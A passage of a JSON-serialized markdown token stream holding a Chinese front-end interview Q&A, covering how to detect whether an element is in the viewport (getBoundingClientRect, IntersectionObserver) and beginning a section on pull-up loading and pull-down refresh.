上述属性都是只读的，每次访问都要重新开始","task":false,"loose":false,"text":"上述属性都是只读的，每次访问都要重新开始","tokens":[{"type":"text","raw":"上述属性都是只读的，每次访问都要重新开始","text":"上述属性都是只读的，每次访问都要重新开始","tokens":[{"type":"text","raw":"上述属性都是只读的，每次访问都要重新开始","text":"上述属性都是只读的，每次访问都要重新开始","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"下面再看看如何实现判断：","text":"下面再看看如何实现判断：","tokens":[{"type":"text","raw":"下面再看看如何实现判断：","text":"下面再看看如何实现判断：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"公式如下：","text":"公式如下：","tokens":[{"type":"text","raw":"公式如下：","text":"公式如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nel.offsetTop - document.documentElement.scrollTop <= viewPortHeight\\n```","lang":"js","text":"el.offsetTop - document.documentElement.scrollTop <= viewPortHeight"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"代码实现：","text":"代码实现：","tokens":[{"type":"text","raw":"代码实现：","text":"代码实现：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction isInViewPortOfOne (el) {\\n    // viewPortHeight 兼容所有浏览器写法\\n    const viewPortHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight \\n    const offsetTop = el.offsetTop\\n    const scrollTop = document.documentElement.scrollTop\\n    const top = offsetTop - scrollTop\\n    return top <= viewPortHeight\\n}\\n```","lang":"js","text":"function isInViewPortOfOne (el) {\\n    // viewPortHeight 兼容所有浏览器写法\\n    const viewPortHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight \\n    const offsetTop = el.offsetTop\\n    const scrollTop = document.documentElement.scrollTop\\n    const top = offsetTop - scrollTop\\n    return top <= viewPortHeight\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 2）getBoundingClientRect\\n\\n","depth":5,"text":"2）getBoundingClientRect","tokens":[{"type":"text","raw":"2）getBoundingClientRect","text":"2）getBoundingClientRect","escaped":false}]},{"type":"paragraph","raw":"返回值是一个 `DOMRect`对象，拥有`left`, `top`, `right`, `bottom`, `x`, `y`, `width`, 和 `height`属性","text":"返回值是一个 `DOMRect`对象，拥有`left`, `top`, `right`, `bottom`, `x`, `y`, `width`, 和 `height`属性","tokens":[{"type":"text","raw":"返回值是一个 ","text":"返回值是一个 ","escaped":false},{"type":"codespan","raw":"`DOMRect`","text":"DOMRect"},{"type":"text","raw":"对象，拥有","text":"对象，拥有","escaped":false},{"type":"codespan","raw":"`left`","text":"left"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`top`","text":"top"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`right`","text":"right"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`bottom`","text":"bottom"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`x`","text":"x"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`y`","text":"y"},{"type":"text","raw":", ","text":", ","escaped":false},{"type":"codespan","raw":"`width`","text":"width"},{"type":"text","raw":", 和 ","text":", 和 ","escaped":false},{"type":"codespan","raw":"`height`","text":"height"},{"type":"text","raw":"属性","text":"属性","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst target = document.querySelector(\'.target\');\\nconst clientRect = target.getBoundingClientRect();\\nconsole.log(clientRect);\\n\\n// {\\n//   bottom: 556.21875,\\n//   height: 393.59375,\\n//   left: 333,\\n//   right: 1017,\\n//   top: 162.625,\\n//   width: 684\\n// }\\n```","lang":"js","text":"const target = document.querySelector(\'.target\');\\nconst clientRect = target.getBoundingClientRect();\\nconsole.log(clientRect);\\n\\n// {\\n//   bottom: 556.21875,\\n//   height: 393.59375,\\n//   left: 333,\\n//   right: 1017,\\n//   top: 162.625,\\n//   width: 684\\n// }"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"属性对应的关系图如下所示：","text":"属性对应的关系图如下所示：","tokens":[{"type":"text","raw":"属性对应的关系图如下所示：","text":"属性对应的关系图如下所示：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241230002050.png)","text":"![](/public/images/3_JavaScript_20241230002050.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241230002050.png)","href":"/public/images/3_JavaScript_20241230002050.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"当页面发生滚动的时候，`top`与`left`属性值都会随之改变","text":"当页面发生滚动的时候，`top`与`left`属性值都会随之改变","tokens":[{"type":"text","raw":"当页面发生滚动的时候，","text":"当页面发生滚动的时候，","escaped":false},{"type":"codespan","raw":"`top`","text":"top"},{"type":"text","raw":"与","text":"与","escaped":false},{"type":"codespan","raw":"`left`","text":"left"},{"type":"text","raw":"属性值都会随之改变","text":"属性值都会随之改变","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"如果一个元素在视窗之内的话，那么它一定满足下面四个条件：","text":"如果一个元素在视窗之内的话，那么它一定满足下面四个条件：","tokens":[{"type":"text","raw":"如果一个元素在视窗之内的话，那么它一定满足下面四个条件：","text":"如果一个元素在视窗之内的话，那么它一定满足下面四个条件：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- top 大于等于 0\\n- left 大于等于 0\\n- bottom 小于等于视窗高度\\n- right 小于等于视窗宽度","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- top 大于等于 0\\n","task":false,"loose":false,"text":"top 大于等于 0","tokens":[{"type":"text","raw":"top 大于等于 0","text":"top 大于等于 0","tokens":[{"type":"text","raw":"top 大于等于 0","text":"top 大于等于 0","escaped":false}]}]},{"type":"list_item","raw":"- left 大于等于 0\\n","task":false,"loose":false,"text":"left 大于等于 0","tokens":[{"type":"text","raw":"left 大于等于 0","text":"left 大于等于 0","tokens":[{"type":"text","raw":"left 大于等于 0","text":"left 大于等于 0","escaped":false}]}]},{"type":"list_item","raw":"- bottom 小于等于视窗高度\\n","task":false,"loose":false,"text":"bottom 小于等于视窗高度","tokens":[{"type":"text","raw":"bottom 小于等于视窗高度","text":"bottom 小于等于视窗高度","tokens":[{"type":"text","raw":"bottom 小于等于视窗高度","text":"bottom 小于等于视窗高度","escaped":false}]}]},{"type":"list_item","raw":"- right 小于等于视窗宽度","task":false,"loose":false,"text":"right 小于等于视窗宽度","tokens":[{"type":"text","raw":"right 小于等于视窗宽度","text":"right 小于等于视窗宽度","tokens":[{"type":"text","raw":"right 小于等于视窗宽度","text":"right 小于等于视窗宽度","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"实现代码如下：","text":"实现代码如下：","tokens":[{"type":"text","raw":"实现代码如下：","text":"实现代码如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction isInViewPort(element) {\\n  const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n  const viewHeight = window.innerHeight || document.documentElement.clientHeight;\\n  const {\\n    top,\\n    right,\\n    bottom,\\n    left,\\n  } = element.getBoundingClientRect();\\n\\n  return (\\n    top >= 0 &&\\n    left >= 0 &&\\n    right <= viewWidth &&\\n    bottom <= viewHeight\\n  );\\n}\\n```","lang":"js","text":"function isInViewPort(element) {\\n  const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n  const viewHeight = window.innerHeight || document.documentElement.clientHeight;\\n  const {\\n    top,\\n    right,\\n    bottom,\\n    left,\\n  } = element.getBoundingClientRect();\\n\\n  return (\\n    top >= 0 &&\\n    left >= 0 &&\\n    right <= viewWidth &&\\n    bottom <= viewHeight\\n  );\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 3）Intersection Observer\\n\\n","depth":5,"text":"3）Intersection Observer","tokens":[{"type":"text","raw":"3）Intersection Observer","text":"3）Intersection Observer","escaped":false}]},{"type":"paragraph","raw":"`Intersection Observer` 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比 `getBoundingClientRect` 会好很多","text":"`Intersection Observer` 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比 `getBoundingClientRect` 会好很多","tokens":[{"type":"codespan","raw":"`Intersection Observer`","text":"Intersection Observer"},{"type":"text","raw":" 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比 ","text":" 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比 ","escaped":false},{"type":"codespan","raw":"`getBoundingClientRect`","text":"getBoundingClientRect"},{"type":"text","raw":" 会好很多","text":" 会好很多","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用步骤主要分为两步：创建观察者和传入被观察者","text":"使用步骤主要分为两步：创建观察者和传入被观察者","tokens":[{"type":"text","raw":"使用步骤主要分为两步：创建观察者和传入被观察者","text":"使用步骤主要分为两步：创建观察者和传入被观察者","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"###### 创建观察者\\n\\n","depth":6,"text":"创建观察者","tokens":[{"type":"text","raw":"创建观察者","text":"创建观察者","escaped":false}]},{"type":"code","raw":"```js\\nconst options = {\\n  // 表示重叠面积占被观察者的比例，从 0 - 1 取值，\\n  // 1 表示完全被包含\\n  threshold: 1.0, \\n  root:document.querySelector(\'#scrollArea\') // 必须是目标元素的父级元素\\n};\\n\\nconst callback = (entries, observer) => { ....}\\n\\nconst observer = new IntersectionObserver(callback, options);\\n```","lang":"js","text":"const options = {\\n  // 表示重叠面积占被观察者的比例，从 0 - 1 取值，\\n  // 1 表示完全被包含\\n  threshold: 1.0, \\n  root:document.querySelector(\'#scrollArea\') // 必须是目标元素的父级元素\\n};\\n\\nconst callback = (entries, observer) => { ....}\\n\\nconst observer = new IntersectionObserver(callback, options);"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"通过`new IntersectionObserver`创建了观察者 `observer`，传入的参数 `callback` 在重叠比例超过 `threshold` 时会被执行`","text":"通过`new IntersectionObserver`创建了观察者 `observer`，传入的参数 `callback` 在重叠比例超过 `threshold` 时会被执行`","tokens":[{"type":"text","raw":"通过","text":"通过","escaped":false},{"type":"codespan","raw":"`new IntersectionObserver`","text":"new IntersectionObserver"},{"type":"text","raw":"创建了观察者 ","text":"创建了观察者 ","escaped":false},{"type":"codespan","raw":"`observer`","text":"observer"},{"type":"text","raw":"，传入的参数 ","text":"，传入的参数 ","escaped":false},{"type":"codespan","raw":"`callback`","text":"callback"},{"type":"text","raw":" 在重叠比例超过 ","text":" 在重叠比例超过 ","escaped":false},{"type":"codespan","raw":"`threshold`","text":"threshold"},{"type":"text","raw":" 时会被执行`","text":" 时会被执行`","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"关于`callback`回调函数常用属性如下：","text":"关于`callback`回调函数常用属性如下：","tokens":[{"type":"text","raw":"关于","text":"关于","escaped":false},{"type":"codespan","raw":"`callback`","text":"callback"},{"type":"text","raw":"回调函数常用属性如下：","text":"回调函数常用属性如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// 上段代码中被省略的 callback\\nconst callback = function(entries, observer) { \\n    entries.forEach(entry => {\\n        entry.time;               // 触发的时间\\n        entry.rootBounds;         // 根元素的位置矩形，这种情况下为视窗位置\\n        entry.boundingClientRect; // 被观察者的位置举行\\n        entry.intersectionRect;   // 重叠区域的位置矩形\\n        entry.intersectionRatio;  // 重叠区域占被观察者面积的比例（被观察者不是矩形时也按照矩形计算）\\n        entry.target;             // 被观察者\\n    });\\n};\\n```","lang":"js","text":"// 上段代码中被省略的 callback\\nconst callback = function(entries, observer) { \\n    entries.forEach(entry => {\\n        entry.time;               // 触发的时间\\n        entry.rootBounds;         // 根元素的位置矩形，这种情况下为视窗位置\\n        entry.boundingClientRect; // 被观察者的位置举行\\n        entry.intersectionRect;   // 重叠区域的位置矩形\\n        entry.intersectionRatio;  // 重叠区域占被观察者面积的比例（被观察者不是矩形时也按照矩形计算）\\n        entry.target;             // 被观察者\\n    });\\n};"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"###### 传入被观察者\\n\\n","depth":6,"text":"传入被观察者","tokens":[{"type":"text","raw":"传入被观察者","text":"传入被观察者","escaped":false}]},{"type":"paragraph","raw":"通过 `observer.observe(target)` 这一行代码即可简单的注册被观察者","text":"通过 `observer.observe(target)` 这一行代码即可简单的注册被观察者","tokens":[{"type":"text","raw":"通过 ","text":"通过 ","escaped":false},{"type":"codespan","raw":"`observer.observe(target)`","text":"observer.observe(target)"},{"type":"text","raw":" 这一行代码即可简单的注册被观察者","text":" 这一行代码即可简单的注册被观察者","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst target = document.querySelector(\'.target\');\\nobserver.observe(target);\\n```","lang":"js","text":"const target = document.querySelector(\'.target\');\\nobserver.observe(target);"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 4）案例分析\\n\\n","depth":5,"text":"4）案例分析","tokens":[{"type":"text","raw":"4）案例分析","text":"4）案例分析","escaped":false}]},{"type":"paragraph","raw":"实现：创建了一个十万个节点的长列表，当节点滚入到视窗中时，背景就会从红色变为黄色","text":"实现：创建了一个十万个节点的长列表，当节点滚入到视窗中时，背景就会从红色变为黄色","tokens":[{"type":"text","raw":"实现：创建了一个十万个节点的长列表，当节点滚入到视窗中时，背景就会从红色变为黄色","text":"实现：创建了一个十万个节点的长列表，当节点滚入到视窗中时，背景就会从红色变为黄色","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"`Html`结构如下：","text":"`Html`结构如下：","tokens":[{"type":"codespan","raw":"`Html`","text":"Html"},{"type":"text","raw":"结构如下：","text":"结构如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n<div class=\\"container\\"></div>\\n```","lang":"js","text":"<div class=\\"container\\"></div>"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"`css`样式如下：","text":"`css`样式如下：","tokens":[{"type":"codespan","raw":"`css`","text":"css"},{"type":"text","raw":"样式如下：","text":"样式如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n.container {\\n    display: flex;\\n    flex-wrap: wrap;\\n}\\n.target {\\n    margin: 5px;\\n    width: 20px;\\n    height: 20px;\\n    background: red;\\n}\\n```","lang":"css","text":".container {\\n    display: flex;\\n    flex-wrap: wrap;\\n}\\n.target {\\n    margin: 5px;\\n    width: 20px;\\n    height: 20px;\\n    background: red;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"往`container`插入1000个元素","text":"往`container`插入1000个元素","tokens":[{"type":"text","raw":"往","text":"往","escaped":false},{"type":"codespan","raw":"`container`","text":"container"},{"type":"text","raw":"插入1000个元素","text":"插入1000个元素","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst $container = $(\\".container\\");\\n\\n// 插入 100000 个 <div class=\\"target\\"></div>\\nfunction createTargets() {\\n  const htmlString = new Array(100000)\\n    .fill(\'<div class=\\"target\\"></div>\')\\n    .join(\\"\\");\\n  $container.html(htmlString);\\n}\\n```","lang":"js","text":"const $container = $(\\".container\\");\\n\\n// 插入 100000 个 <div class=\\"target\\"></div>\\nfunction createTargets() {\\n  const htmlString = new Array(100000)\\n    .fill(\'<div class=\\"target\\"></div>\')\\n    .join(\\"\\");\\n  $container.html(htmlString);\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"这里，首先使用 `getBoundingClientRect` 方法进行判断元素是否在可视区域","text":"这里，首先使用 `getBoundingClientRect` 方法进行判断元素是否在可视区域","tokens":[{"type":"text","raw":"这里，首先使用 ","text":"这里，首先使用 ","escaped":false},{"type":"codespan","raw":"`getBoundingClientRect`","text":"getBoundingClientRect"},{"type":"text","raw":" 方法进行判断元素是否在可视区域","text":" 方法进行判断元素是否在可视区域","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction isInViewPort(element) {\\n    const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n    const viewHeight =\\n          window.innerHeight || document.documentElement.clientHeight;\\n    const { top, right, bottom, left } = element.getBoundingClientRect();\\n\\n    return top >= 0 && left >= 0 && right <= viewWidth && bottom <= viewHeight;\\n}\\n```","lang":"js","text":"function isInViewPort(element) {\\n    const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n    const viewHeight =\\n          window.innerHeight || document.documentElement.clientHeight;\\n    const { top, right, bottom, left } = element.getBoundingClientRect();\\n\\n    return top >= 0 && left >= 0 && right <= viewWidth && bottom <= viewHeight;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"然后开始监听`scroll`事件，判断页面上哪些元素在可视区域中，如果在可视区域中则将背景颜色设置为`yellow`","text":"然后开始监听`scroll`事件，判断页面上哪些元素在可视区域中，如果在可视区域中则将背景颜色设置为`yellow`","tokens":[{"type":"text","raw":"然后开始监听","text":"然后开始监听","escaped":false},{"type":"codespan","raw":"`scroll`","text":"scroll"},{"type":"text","raw":"事件，判断页面上哪些元素在可视区域中，如果在可视区域中则将背景颜色设置为","text":"事件，判断页面上哪些元素在可视区域中，如果在可视区域中则将背景颜色设置为","escaped":false},{"type":"codespan","raw":"`yellow`","text":"yellow"}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n$(window).on(\\"scroll\\", () => {\\n    console.log(\\"scroll !\\");\\n    $targets.each((index, element) => {\\n        if (isInViewPort(element)) {\\n            $(element).css(\\"background-color\\", \\"yellow\\");\\n        }\\n    });\\n});\\n```","lang":"js","text":"$(window).on(\\"scroll\\", () => {\\n    console.log(\\"scroll !\\");\\n    $targets.each((index, element) => {\\n        if (isInViewPort(element)) {\\n            $(element).css(\\"background-color\\", \\"yellow\\");\\n        }\\n    });\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"通过上述方式，可以看到可视区域颜色会变成黄色了，但是可以明显看到有卡顿的现象，原因在于我们绑定了`scroll`事件，`scroll`事件伴随了大量的计算，会造成资源方面的浪费","text":"通过上述方式，可以看到可视区域颜色会变成黄色了，但是可以明显看到有卡顿的现象，原因在于我们绑定了`scroll`事件，`scroll`事件伴随了大量的计算，会造成资源方面的浪费","tokens":[{"type":"text","raw":"通过上述方式，可以看到可视区域颜色会变成黄色了，但是可以明显看到有卡顿的现象，原因在于我们绑定了","text":"通过上述方式，可以看到可视区域颜色会变成黄色了，但是可以明显看到有卡顿的现象，原因在于我们绑定了","escaped":false},{"type":"codespan","raw":"`scroll`","text":"scroll"},{"type":"text","raw":"事件，","text":"事件，","escaped":false},{"type":"codespan","raw":"`scroll`","text":"scroll"},{"type":"text","raw":"事件伴随了大量的计算，会造成资源方面的浪费","text":"事件伴随了大量的计算，会造成资源方面的浪费","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"下面通过`Intersection Observer`的形式同样实现相同的功能","text":"下面通过`Intersection Observer`的形式同样实现相同的功能","tokens":[{"type":"text","raw":"下面通过","text":"下面通过","escaped":false},{"type":"codespan","raw":"`Intersection Observer`","text":"Intersection Observer"},{"type":"text","raw":"的形式同样实现相同的功能","text":"的形式同样实现相同的功能","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"首先创建一个观察者","text":"首先创建一个观察者","tokens":[{"type":"text","raw":"首先创建一个观察者","text":"首先创建一个观察者","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst observer = new IntersectionObserver(getYellow, { threshold: 1.0 });\\n```","lang":"js","text":"const observer = new IntersectionObserver(getYellow, { threshold: 1.0 });"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"`getYellow`回调函数实现对背景颜色改变，如下：","text":"`getYellow`回调函数实现对背景颜色改变，如下：","tokens":[{"type":"codespan","raw":"`getYellow`","text":"getYellow"},{"type":"text","raw":"回调函数实现对背景颜色改变，如下：","text":"回调函数实现对背景颜色改变，如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction getYellow(entries, observer) {\\n    entries.forEach(entry => {\\n        $(entry.target).css(\\"background-color\\", \\"yellow\\");\\n    });\\n}\\n```","lang":"js","text":"function getYellow(entries, observer) {\\n    entries.forEach(entry => {\\n        $(entry.target).css(\\"background-color\\", \\"yellow\\");\\n    });\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"最后传入观察者，即`.target`元素","text":"最后传入观察者，即`.target`元素","tokens":[{"type":"text","raw":"最后传入观察者，即","text":"最后传入观察者，即","escaped":false},{"type":"codespan","raw":"`.target`","text":".target"},{"type":"text","raw":"元素","text":"元素","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n$targets.each((index, element) => {\\n    observer.observe(element);\\n});\\n```","lang":"js","text":"$targets.each((index, element) => {\\n    observer.observe(element);\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"可以看到功能同样完成，并且页面不会出现卡顿的情况","text":"可以看到功能同样完成，并且页面不会出现卡顿的情况","tokens":[{"type":"text","raw":"可以看到功能同样完成，并且页面不会出现卡顿的情况","text":"可以看到功能同样完成，并且页面不会出现卡顿的情况","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 如何实现一个上拉加载，下拉刷新？\\n\\n","depth":2,"text":"如何实现一个上拉加载，下拉刷新？","tokens":[{"type":"text","raw":"如何实现一个上拉加载，下拉刷新？","text":"如何实现一个上拉加载，下拉刷新？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 上拉加载","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 上拉加载","task":false,"loose":false,"text":"**2：** 上拉加载","tokens":[{"type":"text","raw":"**2：** 上拉加载","text":"**2：** 上拉加载","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 上拉加载","text":" 上拉加载","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"首先可以看一张图","text":"首先可以看一张图","tokens":[{"type":"text","raw":"首先可以看一张图","text":"首先可以看一张图","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241230002614.png)","text":"![](/public/images/3_JavaScript_20241230002614.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241230002614.png)","href":"/public/images/3_JavaScript_20241230002614.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"上拉加载的本质是页面触底，或者快要触底时的动作","text":"上拉加载的本质是页面触底，或者快要触底时的动作","tokens":[{"type":"text","raw":"上拉加载的本质是页面触底，或者快要触底时的动作","text":"上拉加载的本质是页面触底，或者快要触底时的动作","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"判断页面触底我们需要先了解一下下面几个属性","text":"判断页面触底我们需要先了解一下下面几个属性","tokens":[{"type":"text","raw":"判断页面触底我们需要先了解一下下面几个属性","text":"判断页面触底我们需要先了解一下下面几个属性","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- `scrollTop`：滚动视窗的高度距离`window`顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值\\n\\n- `clientHeight`:它是一个定值，表示屏幕可视区域的高度；\\n- `scrollHeight`：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示`body`所有元素的总长度(包括body元素自身的padding)","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- `scrollTop`：滚动视窗的高度距离`window`顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值\\n\\n","task":false,"loose":true,"text":"`scrollTop`：滚动视窗的高度距离`window`顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值\\n","tokens":[{"type":"text","raw":"`scrollTop`：滚动视窗的高度距离`window`顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值\\n","text":"`scrollTop`：滚动视窗的高度距离`window`顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值","tokens":[{"type":"codespan","raw":"`scrollTop`","text":"scrollTop"},{"type":"text","raw":"：滚动视窗的高度距离","text":"：滚动视窗的高度距离","escaped":false},{"type":"codespan","raw":"`window`","text":"window"},{"type":"text","raw":"顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值","text":"顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值","escaped":false}]}]},{"type":"list_item","raw":"- `clientHeight`:它是一个定值，表示屏幕可视区域的高度；\\n","task":false,"loose":true,"text":"`clientHeight`:它是一个定值，表示屏幕可视区域的高度；","tokens":[{"type":"text","raw":"`clientHeight`:它是一个定值，表示屏幕可视区域的高度；","text":"`clientHeight`:它是一个定值，表示屏幕可视区域的高度；","tokens":[{"type":"codespan","raw":"`clientHeight`","text":"clientHeight"},{"type":"text","raw":":它是一个定值，表示屏幕可视区域的高度；","text":":它是一个定值，表示屏幕可视区域的高度；","escaped":false}]}]},{"type":"list_item","raw":"- `scrollHeight`：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示`body`所有元素的总长度(包括body元素自身的padding)","task":false,"loose":true,"text":"`scrollHeight`：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示`body`所有元素的总长度(包括body元素自身的padding)","tokens":[{"type":"text","raw":"`scrollHeight`：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示`body`所有元素的总长度(包括body元素自身的padding)","text":"`scrollHeight`：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示`body`所有元素的总长度(包括body元素自身的padding)","tokens":[{"type":"codespan","raw":"`scrollHeight`","text":"scrollHeight"},{"type":"text","raw":"：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示","text":"：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示","escaped":false},{"type":"codespan","raw":"`body`","text":"body"},{"type":"text","raw":"所有元素的总长度(包括body元素自身的padding)","text":"所有元素的总长度(包括body元素自身的padding)","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"综上我们得出一个触底公式：","text":"综上我们得出一个触底公式：","tokens":[{"type":"text","raw":"综上我们得出一个触底公式：","text":"综上我们得出一个触底公式：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nscrollTop + clientHeight >= scrollHeight\\n```","lang":"js","text":"scrollTop + clientHeight >= scrollHeight"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"简单实现","text":"简单实现","tokens":[{"type":"text","raw":"简单实现","text":"简单实现","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nlet clientHeight  = document.documentElement.clientHeight; //浏览器高度\\nlet scrollHeight = document.body.scrollHeight;\\nlet scrollTop = document.documentElement.scrollTop;\\n \\nlet distance = 50;  //距离视窗还用50的时候，开始触发；\\n\\nif ((scrollTop + clientHeight) >= (scrollHeight - distance)) {\\n    console.log(\\"开始加载数据\\");\\n}\\n```","lang":"js","text":"let clientHeight  = document.documentElement.clientHeight; //浏览器高度\\nlet scrollHeight = document.body.scrollHeight;\\nlet scrollTop = document.documentElement.scrollTop;\\n \\nlet distance = 50;  //距离视窗还用50的时候，开始触发；\\n\\nif ((scrollTop + clientHeight) >= (scrollHeight - distance)) {\\n    console.log(\\"开始加载数据\\");\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 下拉刷新","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 下拉刷新","task":false,"loose":false,"text":"**2：** 下拉刷新","tokens":[{"type":"text","raw":"**2：** 下拉刷新","text":"**2：** 